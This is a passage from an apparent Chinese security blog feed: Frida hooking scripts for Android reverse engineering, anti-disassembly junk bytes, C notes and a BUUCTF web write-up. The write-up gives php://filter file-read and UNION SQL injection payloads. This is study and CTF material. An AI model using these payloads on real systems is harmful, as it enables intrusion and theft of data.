class="hljs-string">&quot;hook call function begin!hooking address :=&gt;&quot;</span>,_call_function_addr)<br>    Interceptor.attach(_call_function_addr,&#123;<br>        onEnter:<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(args)</span></span>&#123;<br>            <span class="hljs-keyword">if</span>(args[<span class="hljs-number">2</span>].readCString().indexOf(<span class="hljs-string">&quot;base.odex&quot;</span>)&lt;<span class="hljs-number">0</span>)&#123;<br>                console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;function_name : agrs[0]=&gt;&quot;</span>,args[<span class="hljs-number">0</span>].readCString())<br>                console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;so path : agrs[2]=&gt;&quot;</span>,args[<span class="hljs-number">2</span>].readCString())<br>                console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;function offset : args[1]=&gt;&quot;</span>,<span class="hljs-string">&quot;0x&quot;</span>+(args[<span class="hljs-number">1</span>]-Module.findBaseAddress(<span class="hljs-string">&quot;libnative-lib.so&quot;</span>)).toString(<span class="hljs-number">16</span>))<br>                <br>            &#125;<br>        &#125;,onLeave:<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(retval)</span></span>&#123;<br><br>        &#125;<br>    &#125;)<br>&#125;<br><br>setImmediate(EnumerateAllExports)<br></code></pre></td></tr></table></figure><h1 id="实用知识"><a href="#实用知识" class="headerlink" title="实用知识"></a>实用知识</h1><h2 id="高效工具"><a href="#高效工具" class="headerlink" title="高效工具"></a>高效工具</h2><ul><li>hooa-trace ollvm/vmp克星</li><li>okhttplogger-frida 可过混淆</li><li>jnitrace (<a href="https://github.com/chame1eon/jnitrace">https://github.com/chame1eon/jnitrace</a>)</li><li>registernative (<a href="https://github.com/lasting-yang/frida_hook_libart">https://github.com/lasting-yang/frida_hook_libart</a>)</li><li>objection从文件读取命令批量hook————<code>objection -g  package_name explore -c /xxx/xx/x/xx/xxx.txt</code></li><li>siege 高性能压测工具</li></ul><p>okhttp拦截：</p><p><img src="/2021/06/01/Frida-hook%E5%A4%A7%E5%85%A8/image-20210627231108430.png" alt="image-20210627231108430"></p><p><img src="/2021/06/01/Frida-hook%E5%A4%A7%E5%85%A8/image-20210627231053138.png" alt="image-20210627231053138"></p><p>jnitrace:</p><p><code>jnitrace -l libnative.so com.a.standonthegiants</code></p><p><img src="/2021/06/01/Frida-hook%E5%A4%A7%E5%85%A8/image-20210628115312578.png" alt="image-20210628115312578"></p><p>registernative:</p><p><code>frida -U --no-pause -f package_name -l hook_RegisterNatives.js</code></p><p><img src="/2021/06/01/Frida-hook%E5%A4%A7%E5%85%A8/image-20210628120906976.png" alt="image-20210628120906976"></p><h2 id="socket自吐"><a href="#socket自吐" class="headerlink" title="socket自吐"></a>socket自吐</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">http:<br>hook java<span class="hljs-selector-class">.net</span>.SocketOutputStream和java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.SocketInputStream</span><br>https:<br>android8 <br>hook com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.conscrypt</span>.ConscryptFileDescriptorSocket<span class="hljs-variable">$SSLOutputStream</span>和com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.conscrypt</span>.ConscryptFileDescriptorSocket<span class="hljs-variable">$SSLInputStream</span><br></code></pre></td></tr></table></figure><h2 id="rpc远程调用"><a href="#rpc远程调用" class="headerlink" title="rpc远程调用"></a>rpc远程调用</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs css">import <span class="hljs-selector-tag">time</span><br>import frida<br><span class="hljs-selector-tag">from</span> flask import Flask, jsonify, request<br>import json<br><br>def my_message_handler(message , payload): #定义错误处理<br><span class="hljs-built_in">print</span>(message)<br><span class="hljs-built_in">print</span>(payload)<br><br><br># 连接安卓机上的frida-server<br>#device = frida.<span class="hljs-built_in">get_device_manager</span>().<span class="hljs-built_in">add_remote_device</span>(<span class="hljs-string">&quot;192.168.0.3:8888&quot;</span>)<br>#device = frida.<span class="hljs-built_in">get_device_manager</span>().<span class="hljs-built_in">add_remote_device</span>(<span class="hljs-string">&quot;118.126.66.193:58888&quot;</span>)<br>#device = frida.<span class="hljs-built_in">get_device_manager</span>().<span class="hljs-built_in">add_remote_device</span>(<span class="hljs-string">&quot;118.126.66.193:48888&quot;</span>)<br>device= frida.<span class="hljs-built_in">get_usb_device</span>()<br><br># 启动`demo01`这个app<br>pid = device.<span class="hljs-built_in">spawn</span>([<span class="hljs-string">&quot;com.example.demoso1&quot;</span>])<br>device.<span class="hljs-built_in">resume</span>(pid)<br>time.<span class="hljs-built_in">sleep</span>(<span class="hljs-number">3</span>)<br>session = device.<span class="hljs-built_in">attach</span>(pid)<br># 加载脚本<br>with <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;202010live3invokeJava.js&quot;</span>) as f:<br>    script = session.<span class="hljs-built_in">create_script</span>(f.<span class="hljs-built_in">read</span>())<br>script.<span class="hljs-built_in">on</span>(<span class="hljs-string">&quot;message&quot;</span> , my_message_handler) #调用错误处理<br>script.<span class="hljs-built_in">load</span>()<br><br><span class="hljs-built_in">print</span>(script.exports.<span class="hljs-built_in">fridamethod01</span>(<span class="hljs-string">&quot;roysue&quot;</span>))<br><span class="hljs-built_in">print</span>(script.exports.<span class="hljs-built_in">fridamethod02</span>(<span class="hljs-string">&quot;47fcda3822cd10a8e2f667fa49da783f&quot;</span>))<br><br># 脚本会持续运行等待输入<br>#<span class="hljs-built_in">input</span>()<br><br><br>app = <span class="hljs-built_in">Flask</span>(__name__)<br><br><br>@app.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/encrypt&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])#url加密<br>def <span class="hljs-built_in">encrypt_class</span>():<br>    data = request.<span class="hljs-built_in">get_data</span>()<br>    json_data = json.<span class="hljs-built_in">loads</span>(data.<span class="hljs-built_in">decode</span>(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    postdata = json_data.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;data&quot;</span>)<br>    <span class="hljs-built_in">print</span>(postdata)<br>    res = script.exports.<span class="hljs-built_in">fridamethod01</span>(postdata)<br>    return res<br> <br> <br>@app.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/decrypt&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])#data解密<br>def <span class="hljs-built_in">decrypt_class</span>():<br>    data = request.<span class="hljs-built_in">get_data</span>()<br>    json_data = json.<span class="hljs-built_in">loads</span>(data.<span class="hljs-built_in">decode</span>(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    postdata = json_data.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;data&quot;</span>)<br>    res = script.exports.<span class="hljs-built_in">fridamethod02</span>(postdata)<br>    return res<br> <br> <br> <br>if __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.<span class="hljs-built_in">run</span>()<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. python <span class="hljs-number">202010</span>live<span class="hljs-number">3</span>invokeJava.py <br><span class="hljs-attribute">2</span>. curl -s -X POST <span class="hljs-string">&quot;http://127.0.0.1:5000/encrypt&quot;</span> -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> -d &#x27;&#123;<span class="hljs-string">&quot;data&quot;</span>:<span class="hljs-string">&quot;roysueiloveyou&quot;</span>&#125;&#x27;<br></code></pre></td></tr></table></figure><p><code>压力性能测试：siege -c10 -r100 &quot;http://127.0.0.1:5000/decrypt POST &lt; data.json &quot;</code></p><h1 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h1><ol><li>在HttpURLConnection的开发过程中，设置参数时会用到以下方法。分析并hook上这些方法，写出一两个参数的自吐。</li></ol><p>HttpURLConnection对象参数问题 </p><p>// 设置是否向httpUrlConnection输出，因为这个是post请求，参数要放在 http正文内，因此需要设为true, 默认情况下是false;<br>httpUrlConnection.setDoOutput(true); </p><p>// 设置是否从httpUrlConnection读入，默认情况下是true;<br>httpUrlConnection.setDoInput(true); </p><p>// Post 请求不能使用缓存<br>httpUrlConnection.setUseCaches(false); </p><p>// 设定传送的内容类型是可序列化的java对象 (如果不设此项,在传送序列化对象时,当WEB服务默认的不是这种类型时可能抛      java.io.EOFException)<br>httpUrlConnection.setRequestProperty(“Content-type”, “application/x-java-serialized-object”); </p><p>// 设定请求的方法为”POST”，默认是GET<br>httpUrlConnection.setRequestMethod(“POST”); </p><p>// 连接，从上述第2条中url.openConnection()至此的配置必须要在connect之前完成，<br>        httpUrlConnection.connect(); </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//hook setRequestMethod</span><br>objection直接hook httpUrlConnection.setRequestMethod无效，找到所有http相关类并且hook<br>android hooking search classes http<br>objection -g com<span class="hljs-selector-class">.roysue</span><span class="hljs-selector-class">.httpsocket</span> explore -c http<span class="hljs-selector-class">.txt</span> <br><br><span class="hljs-comment">//hook到相关方法</span><br>com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.okhttp</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.huc</span><span class="hljs-selector-class">.DelegatingHttpsURLConnection</span><span class="hljs-selector-class">.setRequestMethod</span><br>com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.okhttp</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.huc</span><span class="hljs-selector-class">.HttpURLConnectionImpl</span><span class="hljs-selector-class">.setRequestMethod</span><br>com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.okhttp</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.huc</span><span class="hljs-selector-class">.HttpsURLConnectionImpl</span><span class="hljs-selector-class">.setRequestMethod</span><br><br>com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.okhttp</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.huc</span><span class="hljs-selector-class">.DelegatingHttpsURLConnection</span><span class="hljs-selector-class">.setDoOutput</span><br>com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.okhttp</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.huc</span><span class="hljs-selector-class">.HttpsURLConnectionImpl</span><span class="hljs-selector-class">.setDoOutput</span><br><br>com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.okhttp</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.huc</span><span class="hljs-selector-class">.HttpsURLConnectionImpl</span><span class="hljs-selector-class">.setDoInput</span><br>com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.okhttp</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.huc</span><span class="hljs-selector-class">.DelegatingHttpsURLConnection</span><span class="hljs-selector-class">.setDoInput</span><br><br>com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.okhttp</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.huc</span><span class="hljs-selector-class">.DelegatingHttpsURLConnection</span><span class="hljs-selector-class">.setUseCaches</span><br>com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.okhttp</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.huc</span><span class="hljs-selector-class">.HttpsURLConnectionImpl</span><span class="hljs-selector-class">.setUseCaches</span><br><br>com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.okhttp</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.huc</span><span class="hljs-selector-class">.DelegatingHttpsURLConnection</span><span class="hljs-selector-class">.setRequestProperty</span><br>com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.okhttp</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.huc</span><span class="hljs-selector-class">.HttpURLConnectionImpl</span><span class="hljs-selector-class">.setRequestProperty</span><br><br>例如，找到如下方法：<br></code></pre></td></tr></table></figure><p><img src="/2021/06/01/Frida-hook%E5%A4%A7%E5%85%A8/image-20210713164601678.png" alt="image-20210713164601678"></p><ol start="2"><li>在直播②中给出的Socket的自吐，还差一个服务器IP地址和端口的自吐，补充上。</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">使用wallbreaker得到实例，<br></code></pre></td></tr></table></figure><p><img src="/2021/06/01/Frida-hook%E5%A4%A7%E5%85%A8/image-20210713175725973.png" alt="image-20210713175725973"></p><p><img src="/2021/06/01/Frida-hook%E5%A4%A7%E5%85%A8/image-20210713175739547.png" alt="image-20210713175739547"></p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tcl">var <span class="hljs-keyword">socket</span> = this.<span class="hljs-keyword">socket</span>.value;<br>console.log(<span class="hljs-string">&quot;Address: &quot;</span> + <span class="hljs-keyword">socket</span>.getRemoteSocketAddress() + <span class="hljs-string">&quot;----Port: &quot;</span> + <span class="hljs-keyword">socket</span>.getPort());<br></code></pre></td></tr></table></figure><ol start="3"><li>在课时⑨中给出的init array的自吐 hook_linker，32位版本解决了，请分析64位版本，尝试给出解决方案并解决。</li></ol>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
      <category>Android应用安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>花指令学习</title>
    <link href="/2021/05/31/%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/05/31/%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="编写花指令"><a href="#编写花指令" class="headerlink" title="编写花指令"></a>编写花指令</h3><p>如果我们在写程序的时候嵌入_asm _emit 0E9，反编译器就会把下一条指令当做地址数据，不管下一条指令实际上的四个字节是地址数据还是操作指令。</p><p>win下：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__asm</span> &#123; <br>    <span class="hljs-variable">_emit</span> <span class="hljs-number">075</span>h    <span class="hljs-meta">#jmp $+4</span><br>    <span class="hljs-variable">_emit</span> <span class="hljs-number">2</span>h<br>    <span class="hljs-variable">_emit</span> <span class="hljs-number">0</span>E9h<br>    <span class="hljs-variable">_emit</span> <span class="hljs-number">0</span>EDh<br>&#125;<br></code></pre></td></tr></table></figure><p>Linux下：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">asm __volatile__ (<span class="hljs-string">&quot;.byte 0x75&quot;</span>)<span class="hljs-comment">;</span><br>asm __volatile__ (<span class="hljs-string">&quot;.byte 0x2&quot;</span>)<span class="hljs-comment">;</span><br>asm __volatile__ (<span class="hljs-string">&quot;.byte 0xe9&quot;</span>)<span class="hljs-comment">;</span><br>asm __volatile__ (<span class="hljs-string">&quot;.byte 0xed&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>上面嵌入的4字节数据即可使得程序反汇编反编译出错，注意这里的75是jnz的机器码，所以要求程序执行到这里时Zflag=0。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C基础补充</title>
    <link href="/2021/05/31/C%E5%9F%BA%E7%A1%80%E8%A1%A5%E5%85%85/"/>
    <url>/2021/05/31/C%E5%9F%BA%E7%A1%80%E8%A1%A5%E5%85%85/</url>
    
    <content type="html"><![CDATA[<p>从零开始，注重基础，心无旁骛。</p><h1 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h1><p><img src="/2021/05/31/C%E5%9F%BA%E7%A1%80%E8%A1%A5%E5%85%85/image-20200729180415547.png" alt="image-20200729180415547"></p><h2 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h2><p>使用C语言的宏可以得到各类型的最大值，要包含limits.h库文件。</p><p>浮点数的最大值要包含float.h。</p><p>math.h库有数学公式。</p><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>scanf遇到空白停止读取。</p><p>sizeof计算存储单元，包括<code>\0</code>，strlen计算实际长度。</p><p>对于类型需要sizeof(char),对于特定量sizeof name即可，建议都加圆括号，不会出错。</p><p>const限定符修饰的是变量，不是常量，只是变量只读，不可更改。</p><p><img src="/2021/05/31/C%E5%9F%BA%E7%A1%80%E8%A1%A5%E5%85%85/image-20200729181326723.png" alt="image-20200729181326723"></p><p><img src="/2021/05/31/C%E5%9F%BA%E7%A1%80%E8%A1%A5%E5%85%85/image-20200729231246876.png" alt="image-20200729231246876"></p><p><img src="/2021/05/31/C%E5%9F%BA%E7%A1%80%E8%A1%A5%E5%85%85/image-20200729231610571.png" alt="image-20200729231610571"></p><p><img src="/2021/05/31/C%E5%9F%BA%E7%A1%80%E8%A1%A5%E5%85%85/image-20200729231628042.png" alt="image-20200729231628042"></p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>c99规定可以指定初始化元素，如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span> a[<span class="hljs-number">6</span>] = &#123;[<span class="hljs-number">5</span>] = <span class="hljs-number">111</span>&#125;;<br></code></pre></td></tr></table></figure><p>只需要初始化一个元素，其他未初始化元素会被自动初始化为0。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>C/C++</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C/C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>报错、踩坑记录</title>
    <link href="/2021/05/31/%E6%8A%A5%E9%94%99%E3%80%81%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"/>
    <url>/2021/05/31/%E6%8A%A5%E9%94%99%E3%80%81%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="IDA-python-插件安装"><a href="#IDA-python-插件安装" class="headerlink" title="IDA-python 插件安装"></a>IDA-python 插件安装</h1><ul><li>yara-python安装命令 <code>python2 -m pip install yara-python==3.11.0</code>,因为只有3.11的轮子支持python2的而且是windows的版本。</li></ul><h1 id="VScode和WSL搭建C开发环境"><a href="#VScode和WSL搭建C开发环境" class="headerlink" title="VScode和WSL搭建C开发环境"></a>VScode和WSL搭建C开发环境</h1><ol><li><p>首先安装wsl，微软商店就有。</p></li><li><p>安装VScode。</p></li><li><p>换源</p><p><code>sudo vim /etc/apt/source.list</code></p></li><li><p>更新ubuntu软件，<code>sudo apt-get update</code></p></li><li><p>安装gcc，gdb等工具</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt <span class="hljs-keyword">install </span><span class="hljs-keyword">build-essential</span><br><span class="hljs-keyword"></span>sudo apt <span class="hljs-keyword">install </span>gdb<br></code></pre></td></tr></table></figure></li><li><p>在VScode中安装wsl扩展插件。</p></li><li><p>在VScode中安装C/C++插件。</p></li><li><p>安装code runner插件。</p></li><li><p>要将VScode的目录bin添加到环境变量</p></li><li><p>code runner插件中有run in terminal</p></li><li><p>设置文件执行命令，文件生成目录，在code runner插件的executor map中设置。</p></li></ol><h1 id="Terminal"><a href="#Terminal" class="headerlink" title="Terminal"></a>Terminal</h1><ol><li><p>设置右键菜单</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">@echo off<br><br> reg.exe add &quot;HKEY_CLASSES_ROOT<span class="hljs-symbol">\D</span>irectory<span class="hljs-symbol">\B</span>ackground<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\w</span>t&quot; /f /ve /d &quot;Terminal&quot;<br> reg.exe add &quot;HKEY_CLASSES_ROOT<span class="hljs-symbol">\D</span>irectory<span class="hljs-symbol">\B</span>ackground<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\w</span>t&quot; /f /v &quot;Icon&quot; /t REG_EXPAND_SZ /d &quot;<span class="hljs-symbol">\&quot;</span>C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\S</span>1lenc3<span class="hljs-symbol">\P</span>ictures<span class="hljs-symbol">\S</span>aved Pictures<span class="hljs-symbol">\t</span>erminal.ico&quot;&quot;<br><br> reg.exe add &quot;HKEY_CLASSES_ROOT<span class="hljs-symbol">\D</span>irectory<span class="hljs-symbol">\B</span>ackground<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\w</span>t<span class="hljs-symbol">\c</span>ommand&quot; /f /ve /t REG_EXPAND_SZ /d &quot;<span class="hljs-symbol">\&quot;</span><span class="hljs-variable">%LOCALAPPDATA%</span><span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indowsApps<span class="hljs-symbol">\w</span>t.exe<span class="hljs-symbol">\&quot;</span>&quot;<br><br> pause<br></code></pre></td></tr></table></figure></li></ol><h1 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h1><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs q">sudo apt-<span class="hljs-built_in">get</span> install -y build-essential libssl-<span class="hljs-built_in">dev</span> zlib1g-<span class="hljs-built_in">dev</span> libbz2-<span class="hljs-built_in">dev</span> \<br>libreadline-<span class="hljs-built_in">dev</span> libsqlite3-<span class="hljs-built_in">dev</span> wget curl llvm libncurses5-<span class="hljs-built_in">dev</span> libncursesw5-<span class="hljs-built_in">dev</span> \<br>xz-utils tk-<span class="hljs-built_in">dev</span> libffi-<span class="hljs-built_in">dev</span> liblzma-<span class="hljs-built_in">dev</span> python-openssl git<br></code></pre></td></tr></table></figure><p>libc6-dev依赖问题:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs subunit">安装软件报错：<br><br>下列软件包有未满足的依赖关系：<br> libc6-dev : 破坏: libgcc<span class="hljs-string">-9</span>-dev (&lt; 9.3.0<span class="hljs-string">-5</span>~) 但是 9.2.1<span class="hljs-string">-19</span> 正要被安装<br>E: 错误，pkgProblemResolver::Resolve 发生故障，这可能是有软件包被要求保持现状的缘故。<br><br><br>解决：<br><br>sudo apt install gcc<span class="hljs-string">-9</span>-base<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>日常记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuctf-web-1</title>
    <link href="/2021/05/31/buuctf-web-1/"/>
    <url>/2021/05/31/buuctf-web-1/</url>
    
    <content type="html"><![CDATA[<h1 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h1><p><img src="/2021/05/31/buuctf-web-1/image-20201109115411137.png" alt="image-20201109115411137"></p><p>查看源代码：</p><p><img src="/2021/05/31/buuctf-web-1/image-20201109115428125.png" alt="image-20201109115428125"></p><p><img src="/2021/05/31/buuctf-web-1/image-20201109115438916.png" alt="image-20201109115438916"></p><p>点secret，什么都没发现，但是action.php变为了end.php，应该有重定向，抓包看看，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201109115520854.png" alt="image-20201109115520854"></p><p>然后访问这个页面，得到源码。</p><p><img src="/2021/05/31/buuctf-web-1/image-20201109115541874.png" alt="image-20201109115541874"></p><p>想到可以通过伪协议读取flag。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">secr3t.php?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>将得到的base64编码进行解码，</p><p><img src="/2021/05/31/buuctf-web-1/image-20201109115730608.png" alt="image-20201109115730608"></p><h1 id="Include1"><a href="#Include1" class="headerlink" title="Include1"></a>Include1</h1><p>比上一个题简单，同样伪协议读取flag.php</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/2021/05/31/buuctf-web-1/image-20201109120025091.png" alt="image-20201109120025091"></p><h1 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h1><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs capnproto">&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,schema_name,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>![image-20201109120759230]buuctf-web-1/image-20201109120759230.png)</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs capnproto">&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2021/05/31/buuctf-web-1/image-20201109121016802.png" alt="image-20201109121016802"></p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=&#x27;geek&#x27;#<br></code></pre></td></tr></table></figure><p><img src="/2021/05/31/buuctf-web-1/image-20201109121306743.png" alt="image-20201109121306743"></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">group_concat</span>(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=&#x27;l0ve1ysq1&#x27;<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="/2021/05/31/buuctf-web-1/image-20201109121514689.png" alt="image-20201109121514689"></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 